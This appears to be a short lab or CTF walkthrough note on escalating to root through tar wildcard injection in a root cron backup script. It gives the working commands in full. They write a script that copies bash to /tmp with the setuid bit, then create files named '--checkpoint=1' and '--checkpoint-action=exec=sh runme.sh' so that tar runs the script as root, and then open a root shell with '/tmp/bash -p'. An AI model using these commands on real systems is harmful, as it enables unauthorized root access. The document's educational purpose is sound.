# wildcard crontab

start to disable scheduled task

```bash
cat /etc/crontab 
```

we find file call `/usr/local/bin/compress.sh` have a read permission after display the content of file

![image.png](<../../../.gitbook/assets/image (23).png>)

we found this file take a backup of all files on the system

> tar when find any files start with `—-` make this file as an option that’s make our to execute command by tar

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
# make script run with s privilege
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=sh\ runme.sh
# wait one minute and open bash with root privilege
/tmp/bash -p
```

<figure><img src="../../../.gitbook/assets/image 1 (10).png" alt=""><figcaption></figcaption></figure>
